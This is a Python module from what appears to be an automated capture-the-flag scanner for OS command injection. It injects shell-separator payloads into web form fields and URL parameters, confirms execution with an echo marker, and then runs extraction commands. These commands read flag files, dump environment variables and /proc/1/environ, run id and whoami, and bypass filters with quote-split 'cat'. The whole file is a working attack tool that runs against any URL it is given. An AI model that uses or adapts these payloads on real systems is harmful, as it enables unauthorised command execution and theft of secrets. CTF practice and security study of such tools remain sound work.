"""
Command Injection Module (IMPROVED v2)
Better flag extraction after detection. Reduced false positives.
"""
from backend.core.base_module import BaseModule
from backend.core.parser import Parser
from backend.core.flag_hunter import FlagHunter

# Detect marker — verify real execution, not just reflection
EXEC_MARKER = "TAJ_CMDI_9812_EXEC"

class CMDiModule(BaseModule):
    MODULE_NAME = "cmdi"
    DESCRIPTION = "OS Command Injection"

    DETECT_PAYLOADS = [
        f"; echo {EXEC_MARKER}",
        f"| echo {EXEC_MARKER}",
        f"& echo {EXEC_MARKER}",
        f"`echo {EXEC_MARKER}`",
        f"$(echo {EXEC_MARKER})",
        f"\n echo {EXEC_MARKER}\n",
        f"%0a echo {EXEC_MARKER}",
    ]

    FLAG_PAYLOADS = [
        "; cat /flag.txt",    "| cat /flag.txt",
        "; cat /flag",        "| cat /flag",
        "; cat /flag*",       "| cat /flag*",
        "$(cat /flag.txt)",   "$(cat /flag)",
        "; find / -name flag* 2>/dev/null | head -5 | xargs cat",
        "; find / -maxdepth 5 -name '*.txt' 2>/dev/null | xargs grep -l flag 2>/dev/null | head -3 | xargs cat",
        "; cat /proc/1/environ",
        "; env | grep -i flag",
        "; env",
        "; ls /",
        "; id",
        "; whoami",
    ]

    def run(self) -> dict:
        self.log(f"[CMDi] Starting scan on {self.target_url}")
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results
        flags = FlagHunter.hunt(resp.text)
        [self.add_flag(f) for f in flags]
        forms = Parser.extract_forms(resp.text)
        self.log(f"[CMDi] Found {len(forms)} form(s)")
        for form in forms:
            self._test_form(form)
        self._test_url_params()
        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    def _test_form(self, form):
        action = form["action"] or self.target_url
        if not action.startswith("http"):
            action = self.target_url.rstrip("/") + "/" + action.lstrip("/")
        for field in form["inputs"]:
            if field["type"] in ("submit", "button") or not field["name"]:
                continue
            # Step 1: detect with marker
            for payload in self.DETECT_PAYLOADS:
                data = {i["name"]: (payload if i["name"] == field["name"] else i["value"] or "x")
                        for i in form["inputs"] if i["name"]}
                r = (self.requester.post(action, data=data) if form["method"] == "POST"
                     else self.requester.get(action, params=data))
                if r and EXEC_MARKER in r.text:
                    self.add_vuln({"type": "cmdi", "field": field["name"], "payload": payload})
                    self.log(f"[CMDi] Confirmed on field '{field['name']}'")
                    self._extract_flag_form(action, form, field["name"])
                    return

    def _extract_flag_form(self, action, form, vuln_field):
        self.log(f"[CMDi] Extracting flag via field '{vuln_field}'...")
        for payload in self.FLAG_PAYLOADS:
            data = {i["name"]: (payload if i["name"] == vuln_field else i["value"] or "x")
                    for i in form["inputs"] if i["name"]}
            r = (self.requester.post(action, data=data) if form["method"] == "POST"
                 else self.requester.get(action, params=data))
            if r is None:
                continue
            self.log(f"[CMDi] Output: {r.text[:150].strip()}")
            flags = FlagHunter.hunt(r.text)
            if flags:
                [self.add_flag(f) for f in flags]
                self.add_vuln({"type": "cmdi_flag_captured", "field": vuln_field,
                               "payload": payload, "flags": flags})
                self.log(f"[CMDi] FLAG captured: {flags}")
                return

    def _test_url_params(self):
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        if not params:
            return
        for param in params:
            for payload in self.DETECT_PAYLOADS:
                test = {**params, param: payload}
                url  = urlunparse(parsed._replace(query=urlencode(test, doseq=True)))
                r    = self.requester.raw_get(url)
                if r and EXEC_MARKER in r.text:
                    self.add_vuln({"type": "cmdi_url", "param": param, "payload": payload})
                    self.log(f"[CMDi] URL param '{param}' is vulnerable!")
                    for fp in self.FLAG_PAYLOADS:
                        t2   = {**params, param: fp}
                        url2 = urlunparse(parsed._replace(query=urlencode(t2, doseq=True)))
                        r2   = self.requester.raw_get(url2)
                        if r2:
                            self.log(f"[CMDi] URL output: {r2.text[:150].strip()}")
                            flags = FlagHunter.hunt(r2.text)
                            if flags:
                                [self.add_flag(f) for f in flags]
                                return
                    break

# v2 additions — extend at module level
_EXTRA_FLAG_PAYLOADS = [
    # Windows variants
    "& type C:\\flag.txt",
    "& type C:\\Users\\Administrator\\flag.txt",
    "| type C:\\flag.txt",
    "$(cat /flag*)",
    "; cat /home/*/flag*",
    "; cat /root/flag*",
    "; find / -maxdepth 4 -name '*.txt' -exec grep -l 'CTF\\|FLAG\\|flag{' {} \\;",
    "; printenv | grep -i flag",
    "; cat /app/*.txt 2>/dev/null",
    "; cat /srv/*.txt 2>/dev/null",
    "; ls -la / && cat /flag*",
    # Bypass filters
    ";c'a't /flag.txt",
    ";c\"a\"t /flag.txt",
    ';/bin/cat /flag.txt',
    '; /bin/sh -c "cat /flag*"',
    "; bash -c 'cat /flag*'",
]

CMDiModule.FLAG_PAYLOADS = CMDiModule.FLAG_PAYLOADS + _EXTRA_FLAG_PAYLOADS
